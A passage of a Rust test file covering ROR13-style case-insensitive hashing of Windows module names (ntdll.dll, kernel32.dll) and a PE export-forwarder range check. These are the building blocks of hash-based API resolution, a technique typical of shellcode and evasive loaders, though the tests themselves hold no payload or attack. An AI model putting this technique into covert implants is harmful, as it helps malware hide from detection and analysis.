        assert_eq!(hash_str(b"kernel32.dll"), HASH_KERNEL32_DLL);
    }

    // ── hash_wstr ───────────────────────────────────────────────────────

    #[test]
    fn hash_wstr_matches_hash_str_for_ascii() {
        let ascii = b"ntdll.dll";
        let wide: Vec<u16> = ascii.iter().map(|&b| b as u16).collect();
        let h_str = hash_str(ascii);
        let h_wstr = hash_wstr(&wide);
        assert_eq!(
            h_str, h_wstr,
            "ASCII strings must produce the same hash in narrow and wide encoding"
        );
    }

    #[test]
    fn hash_wstr_case_insensitive() {
        let upper: Vec<u16> = "NTDLL.DLL".encode_utf16().collect();
        let lower: Vec<u16> = "ntdll.dll".encode_utf16().collect();
        assert_eq!(hash_wstr(&upper), hash_wstr(&lower));
    }

    #[test]
    fn hash_wstr_null_terminator() {
        let with_null: Vec<u16> = "ntdll\0extra".encode_utf16().collect();
        let without: Vec<u16> = "ntdll".encode_utf16().collect();
        assert_eq!(hash_wstr(&with_null), hash_wstr(&without));
    }

    #[test]
    fn hash_wstr_empty() {
        let h = hash_wstr(&[]);
        assert_eq!(h, SEED);
    }

    #[test]
    fn hash_wstr_non_ascii_preserves_all_bits() {
        // Non-ASCII u16 values should hash differently from just the low byte.
        let wide: Vec<u16> = vec![0x0100]; // Ā (Latin A with macron)
                                           // Non-ASCII should produce a different hash than ASCII low byte only.
                                           // hash_wstr processes non-ASCII as two separate steps (lo, hi).
        let ascii_lo_only: Vec<u16> = vec![0x00]; // just byte 0x00
        let h_non_ascii = hash_wstr(&wide);
        let h_ascii_lo = hash_wstr(&ascii_lo_only);
        assert_ne!(h_non_ascii, h_ascii_lo);
    }

    // ── is_forwarder ────────────────────────────────────────────────────

    #[test]
    fn is_forwarder_inside_export_dir() {
        assert!(is_forwarder(0x5000, 0x4000, 0x2000));
        // 0x4000 <= 0x5000 < 0x4000 + 0x2000 = 0x6000
    }

    #[test]
    fn is_forwarder_at_start() {
        assert!(is_forwarder(0x4000, 0x4000, 0x2000));
    }

    #[test]
    fn is_forwarder_at_end_minus_one() {
        assert!(is_forwarder(0x5FFF, 0x4000, 0x2000));
    }

    #[test]
    fn is_not_forwarder_at_exact_end() {
        assert!(!is_forwarder(0x6000, 0x4000, 0x2000));
    }

    #[test]
    fn is_not_forwarder_before_dir() {
        assert!(!is_forwarder(0x3FFF, 0x4000, 0x2000));
    }

    #[test]
    fn is_not_forwarder_well_past_dir() {
        assert!(!is_forwarder(0x10000, 0x4000, 0x2000));
    }

    #[test]
    fn is_forwarder_zero_size_dir() {
        // Zero-size export directory — nothing is inside.
        assert!(!is_forwarder(0x4000, 0x4000, 0));
    }

    #[test]
    fn is_forwarder_overflow_protection() {
        // saturating_add prevents overflow: 0xFFFFFFFE + 3 would overflow
        // but saturating_add clamps to usize::MAX, so the check still works.
        // 0xFFFFFFFF is >= 0xFFFFFFFE and < usize::MAX, so it IS a forwarder.
        assert!(is_forwarder(0xFFFFFFFF, 0xFFFFFFFE, 2));
        // An address at exactly the saturated end should NOT be a forwarder.
        assert!(!is_forwarder(usize::MAX, 0xFFFFFFFE, 2));
    }
}

#[cfg(test)]
mod proptests {
    use super::*;
    use proptest::prelude::*;

    proptest! {
        // ── hash_str properties ──────────────────────────────────────────

        #[test]
        fn hash_str_deterministic(bytes: Vec<u8>) {
            let a = hash_str(&bytes);
            let b = hash_str(&bytes);
            prop_assert_eq!(a, b);
        }

        #[test]
        fn hash_str_case_insensitive_any_ascii(a in any::<u8>()) {
            // Generate the case partner and verify they hash identically.
            let b: u8 = if a.is_ascii_alphabetic() {
                if a.is_ascii_lowercase() { a.to_ascii_uppercase() } else { a.to_ascii_lowercase() }
            } else {
                a // non-alpha: identical
            };
            prop_assert_eq!(hash_str(&[a]), hash_str(&[b]));
        }

        #[test]
        fn hash_str_null_terminator_stops_rest_ignored(prefix: Vec<u8>, suffix: Vec<u8>) {
            // No null in prefix, null at the junction.
            let mut input = prefix.clone();
            input.push(0);
            input.extend_from_slice(&suffix);
            prop_assert_eq!(hash_str(&input), hash_str(&prefix));
        }

        #[test]
        fn hash_str_extension_invariant(extra in 1u8..) {
            // Use a single non-null byte as prefix to verify the extension formula.
            // hash_str("[a]") = SEED.rotate_right(13) ^ lower(a)
            // hash_str("[a, extra]") = hash_str("[a]").rotate_right(13) ^ lower(extra)
            let a: u8 = 0x41; // 'A' — known non-null
            let prefix = &[a][..];
            let extended = vec![a, extra];
            let h_prefix = hash_str(prefix);
            let h_extended = hash_str(&extended);
            let expected = h_prefix.rotate_right(13) ^ (extra.to_ascii_lowercase() as u32);
            prop_assert_eq!(h_extended, expected);
        }

        // ── hash_wstr properties ─────────────────────────────────────────

        #[test]
        fn hash_wstr_deterministic(bytes: Vec<u16>) {
            let a = hash_wstr(&bytes);
            let b = hash_wstr(&bytes);
            prop_assert_eq!(a, b);
        }

        #[test]
        fn hash_wstr_matches_hash_str_for_ascii_wide(lo: Vec<u8>) {
            // For ASCII-range code units, hash_wstr on the wide version
            // must equal hash_str on the narrow version.
            let wide: Vec<u16> = lo.iter().map(|&b| b as u16).collect();
            prop_assert_eq!(hash_wstr(&wide), hash_str(&lo));
        }

        #[test]
        fn hash_wstr_null_terminator_stops_rest_ignored(prefix: Vec<u16>, suffix: Vec<u16>) {
            let mut input = prefix.clone();
            input.push(0);
            input.extend_from_slice(&suffix);
            prop_assert_eq!(hash_wstr(&input), hash_wstr(&prefix));
        }

        #[test]
        fn hash_wstr_ascii_case_insensitive(a in 1u16..0x100u16) {
            // For ASCII range (< 0x100), case folding should produce same hash.
            let a8 = a as u8;
            let b: u16 = if a8.is_ascii_alphabetic() {
                if a8.is_ascii_lowercase() { a8.to_ascii_uppercase() as u16 }
                else { a8.to_ascii_lowercase() as u16 }
            } else {
                a // non-alpha ASCII: same byte
            };
            prop_assert_eq!(hash_wstr(&[a]), hash_wstr(&[b]));
        }

        // ── is_forwarder properties ──────────────────────────────────────

        #[test]
        fn is_forwarder_inside_range(rva: usize, dir_rva: usize, size: usize) {
            // When rva is strictly inside [dir_rva, dir_rva+size), it's a forwarder.
            prop_assume!(size > 0);
            prop_assume!(rva >= dir_rva);
            prop_assume!(rva < dir_rva.saturating_add(size));
            prop_assert!(is_forwarder(rva, dir_rva, size));
        }

        #[test]
        fn is_forwarder_outside_below(rva: usize, dir_rva: usize, size: usize) {
            prop_assume!(size > 0);
            prop_assume!(rva < dir_rva);
            prop_assert!(!is_forwarder(rva, dir_rva, size));
        }

        #[test]
        fn is_forwarder_zero_size_means_none(rva: usize, dir_rva: usize) {
            prop_assert!(!is_forwarder(rva, dir_rva, 0));
        }
    }
}
